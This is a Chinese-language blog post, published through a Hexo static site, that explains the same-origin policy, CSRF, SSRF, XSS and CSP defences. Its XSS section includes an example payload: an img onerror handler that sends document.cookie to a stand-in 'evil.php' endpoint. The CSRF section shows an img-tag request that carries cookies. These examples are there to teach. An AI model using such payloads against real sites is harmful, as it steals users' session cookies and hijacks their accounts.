@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>web security | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="description" content="同源协议（SOP)所谓的同源协议，就是阻止程序员访问第三方数据的一种手段，对浏览器本身是没有任何的影响。换句话说，图片该显示显示，但你无法获取到它的二进制，iframe该展示展示，但你获取不到它的节点，ajax该读取读取，但你获取不到它的响应文。 同源协议可以  跨域写操作 跨域嵌入操作不可以 跨域读操作  CSRF（Cross-site request forgery）跨站请求伪造，是一种常见的">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web security">
+<meta property="og:url" content="http://example.com/2020/06/15/web-security/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="同源协议（SOP)所谓的同源协议，就是阻止程序员访问第三方数据的一种手段，对浏览器本身是没有任何的影响。换句话说，图片该显示显示，但你无法获取到它的二进制，iframe该展示展示，但你获取不到它的节点，ajax该读取读取，但你获取不到它的响应文。 同源协议可以  跨域写操作 跨域嵌入操作不可以 跨域读操作  CSRF（Cross-site request forgery）跨站请求伪造，是一种常见的">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2020-06-16T00:05:45.000Z">
+<meta property="article:modified_time" content="2021-06-29T06:52:50.857Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/typeface-source-code-pro@0.0.71/index.min.css">
+
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-web-security" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/06/15/web-security/" class="article-date">
+  <time class="dt-published" datetime="2020-06-16T00:05:45.000Z" itemprop="datePublished">2020-06-15</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="p-name article-title" itemprop="headline name">
+      web security
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="同源协议（SOP"><a href="#同源协议（SOP" class="headerlink" title="同源协议（SOP)"></a>同源协议（SOP)</h1><p>所谓的同源协议，就是阻止程序员访问第三方数据的一种手段，对浏览器本身是没有任何的影响。换句话说，图片该显示显示，但你无法获取到它的二进制，iframe该展示展示，但你获取不到它的节点，ajax该读取读取，但你获取不到它的响应文。</p>
+<p>同源协议可以</p>
+<ul>
+<li>跨域写操作</li>
+<li>跨域嵌入操作<br>不可以</li>
+<li>跨域读操作</li>
+</ul>
+<h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><p>（Cross-site request forgery）跨站请求伪造，是一种常见的攻击方式。是指 A 网站正常登陆后，cookie 正常保存，其他网站 B 通过某种方式调用 A 网站接口进行操作，A 的接口在请求时会自动带上 cookie。<br>上面说了，SOP 可以通过 html tag 加载资源，而且 SOP 不阻止接口请求而是拦截请求结果，CSRF 恰恰占了这两个便宜。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">// 使用xhr请求会受到sop限制，不会带上cookie</span><br><span class="line"> &lt;script&gt;</span><br><span class="line">        var xhr = new XMLHttpRequest();</span><br><span class="line">        xhr.onreadystatechange = function() &#123;//服务器返回值的处理函数，此处使用匿名函数进行实现</span><br><span class="line">            if (xhr.readyState == 4 &amp;&amp; xhr.status == 200) &#123;//</span><br><span class="line">                var responseText = xhr.responseText;</span><br><span class="line">                document.getElementById(&#x27;result&#x27;).innerHTML = responseText;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        xhr.open(&quot;GET&quot;, &quot;http://dummy.restapiexample.com/api/v1/employees&quot;, true);//提交get请求到服务器</span><br><span class="line">        xhr.send(null);</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line"></span><br><span class="line">  // 使用img的tag请求会带上cookie</span><br><span class="line">    &lt;img src=&quot;http://dummy.restapiexample.com/api/v1/employees&quot;/&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>CSRF自动防御策略：同源检测（Origin 和 Referer 验证）。</li>
+<li>CSRF主动防御措施：Token验证 或者 双重Cookie验证 以及配合Samesite Cookie。</li>
+<li>保证页面的幂等性，后端接口不要在GET页面中做用户操作。</li>
+</ul>
+<p>samesite cookie</p>
+<p>第三方网站引导发出的 Cookie，就称为第三方 Cookie。它除了用于 CSRF 攻击，还可以用于用户追踪。<br>Cookie 的SameSite属性用来限制第三方 Cookie，从而减少安全风险。但可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。</p>
+<!-- ![](/images/web_security/same_site.png) -->
+
+<h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><p>SSRF，服务器端请求伪造，服务器请求伪造，是由攻击者构造的漏洞，用于形成服务器发起的请求。通常，SSRF攻击的目标是外部网络无法访问的内部系统。SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。利用的是服务端的请求伪造。ssrf是利用存在缺陷的web应用作为代理攻击远程和本地的服务器</p>
+<h1 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h1><p>XSS 跨站脚本攻击，用户注入恶意的代码，浏览器和服务器没有对用户的输入进行过滤，导致用户注入的脚本嵌入到了页面中。由于浏览器无法识别这些恶意代码正常解析执行，攻击者的恶意操作被成功执行，比如可以获取用户的cookie数据然后发送给自己或者冒充正常用户向被攻击的服务器发送请求。</p>
+<p>xss攻击分类</p>
+<ul>
+<li>反射型：攻击者构造一个带有恶意代码的url链接诱导正常用户点击，服务器接收到这个url对应的请求读取出其中的参数然后没有做过滤就拼接到Html页面发送给浏览器，浏览器解析执行</li>
+<li>存储型： 攻击者将带有恶意代码的内容发送给服务器（比如在论坛上发帖），服务器没有做过滤就将内容存储到数据库中，下次再请求这个页面的时候服务器从数据库中读取出相关的内容拼接到html上，浏览器收到之后解析执行</li>
+<li>dom型：dom型xss主要和前端js有关，是前端js获取到用户的输入没有进行过滤然后拼接到html中</li>
+</ul>
+<p>xss危害</p>
+<ol>
+<li>cookie劫持（窃取cookie）</li>
+<li>钓鱼，利用xss构造出一个登录框，骗取用户账户密码。</li>
+</ol>
+<p>利用错误信息和搜索结果的反射进行的 XSS，称为反射型 XSS<br>盗取用户 cookie，例如插入这样一段代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;img</span><br><span class="line">  src=&quot;xx&quot;</span><br><span class="line">  onerror=&quot;post(&#x27;../evil.php?cakemonster=&#x27; + escape(document.cookie))&quot;</span><br><span class="line">/&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还有另一种 XSS 是储存型 XSS。储存型也比较容易理解，攻击者把恶意脚本提交到被害服务器，并成功储存，所有人访问特定页面都会遭到攻击。</p>
+<p>总之，如果开发者没有将用户输入的文本进行合适的过滤，就贸然插入到 HTML 中，这很容易造成注入漏洞。攻击者可以利用漏洞，构造出恶意的代码指令，进而利用恶意代码危害数据安全。</p>
+<p>XSS防御：</p>
+<p>对于XSS攻击来说，通常有两种方式来进行防御。</p>
+<p>1、转义字符；<br>2、CSP安全内容策略：CSP 本质上就是建立白名单，开发者明确告诉浏览器哪些外部资源可以加载和执行。我们只需要配置规则，如何拦截是由浏览器自己实现的。我们可以通过这种方式来尽量减少 XSS 攻击。</p>
+<h1 id="Content-Security-Policy"><a href="#Content-Security-Policy" class="headerlink" title="Content Security Policy"></a>Content Security Policy</h1><p>CSP 诞生的主要目的就是防御 XSS 攻击. 严格的 CSP 在 XSS 的防范中可以起到以下的作用：</p>
+<ul>
+<li>禁止加载外域代码，防止复杂的攻击逻辑。</li>
+<li>禁止外域提交，网站被攻击后，用户的数据不会泄露到外域。</li>
+<li>禁止内联脚本执行（规则较严格，目前发现 GitHub 使用）。</li>
+<li>禁止未授权的脚本执行（新特性，Google Map 移动版在使用）。</li>
+<li>合理使用上报可以及时发现 XSS，利于尽快修复问题。</li>
+</ul>
+<p>CSP 的作用</p>
+<ol>
+<li>不允许内联script执行</li>
+<li>不允许加载非信任的脚本资源</li>
+<li>不允许向非信任的url发送信息</li>
+</ol>
+<p>通常可以通过两种方式来开启 CSP：</p>
+<ul>
+<li>设置 HTTP Header 中的 Content-Security-Policy</li>
+<li>设置 meta 标签的方式</li>
+</ul>
+<p>CSP doesn’t (and can’t) prevent CSRF. Even if you forbid all scripts from executing, CSRF attacks are still possible if no per-request tokens are used</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/06/15/web-security/" data-id="ckqhp9u6z001b3ot06u8vfa5p" data-title="web security" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/08/06/crypto/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          对称加密/非对称加密
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/06/15/Volatile/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">Volatile</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/ACM/" rel="tag">ACM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/JVM/" rel="tag">JVM</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Linux/" rel="tag">Linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Spring/" rel="tag">Spring</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/ACM/" style="font-size: 15px;">ACM</a> <a href="/tags/CTF/" style="font-size: 12.5px;">CTF</a> <a href="/tags/JVM/" style="font-size: 17.5px;">JVM</a> <a href="/tags/Linux/" style="font-size: 20px;">Linux</a> <a href="/tags/Spring/" style="font-size: 10px;">Spring</a> <a href="/tags/Web/" style="font-size: 15px;">Web</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/12/">December 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/06/">June 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/05/">May 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/06/13/python/">Python</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/09/virtualbox-ubuntu/">virtualbox ubuntu安装配置</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/v2ray/">搭梯子</a>
+          </li>
+        
+          <li>
+            <a href="/2021/02/08/SuffixArray/">SuffixArray</a>
+          </li>
+        
+          <li>
+            <a href="/2021/01/29/IO-Multiplexing/">I/O 多路复用</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2021 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.4.1.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
